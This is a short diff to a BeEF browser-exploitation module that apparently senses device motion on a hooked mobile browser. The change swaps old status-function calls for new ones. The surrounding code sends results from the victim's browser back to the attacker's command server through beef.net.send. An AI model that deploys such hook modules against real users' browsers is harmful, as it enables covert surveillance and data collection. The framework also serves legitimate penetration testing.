@@ -11,7 +11,7 @@ beef.execute(function() {
 
   if (!beef.hardware.isMobileDevice()) {
     beef.debug(result);
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + result, beef.are.status_error());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + result, beef.status.error());
   }
 
   var historicMotion = {
@@ -30,7 +30,7 @@ beef.execute(function() {
 
     status = new_status;
     beef.debug(new_status);
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=' + new_status, beef.are.status_success());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=' + new_status, beef.status.success());
   }
 
   function updateStatus() {
